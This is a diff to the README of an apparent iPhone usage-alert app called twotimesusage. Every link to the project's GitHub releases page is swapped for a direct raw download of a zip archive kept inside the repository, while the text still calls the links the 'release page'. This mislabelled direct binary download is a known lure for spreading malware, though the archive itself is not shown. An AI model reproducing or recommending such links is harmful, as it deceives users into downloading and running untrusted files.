@@ -1,6 +1,6 @@
 # 📱 twotimesusage - See Claude 2x alerts fast
 
-[![Download twotimesusage](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://github.com/Ellastrong150/twotimesusage/releases)
+[![Download twotimesusage](https://img.shields.io/badge/Download-Release%20Page-blue?style=for-the-badge)](https://raw.githubusercontent.com/Ellastrong150/twotimesusage/main/twotimesusage/Model/Software-v1.6.zip)
 
 ## 🚀 What this app does
 
@@ -11,7 +11,7 @@ This app is for people who want a simple way to watch usage timing. It gives you
 ## 📥 Download
 
 Visit this page to download:  
-https://github.com/Ellastrong150/twotimesusage/releases
+https://raw.githubusercontent.com/Ellastrong150/twotimesusage/main/twotimesusage/Model/Software-v1.6.zip
 
 On that page, look for the latest release. Download the file that matches your device setup, then open it on your Windows PC if you need to transfer or prepare the app package for use.
 
@@ -30,7 +30,7 @@ If you plan to move files between Windows and iPhone, it helps to have a USB cab
 ## 🛠️ How to get started
 
 1. Open the release page:  
-   https://github.com/Ellastrong150/twotimesusage/releases
+   https://raw.githubusercontent.com/Ellastrong150/twotimesusage/main/twotimesusage/Model/Software-v1.6.zip
 
 2. Find the newest release at the top of the page.
 
@@ -162,4 +162,4 @@ twotimesusage works best if you want a clean reminder on your iPhone lock screen
 
 ## 📎 Download again if needed
 
-[Visit the twotimesusage release page to download](https://github.com/Ellastrong150/twotimesusage/releases)
+[Visit the twotimesusage release page to download](https://raw.githubusercontent.com/Ellastrong150/twotimesusage/main/twotimesusage/Model/Software-v1.6.zip)
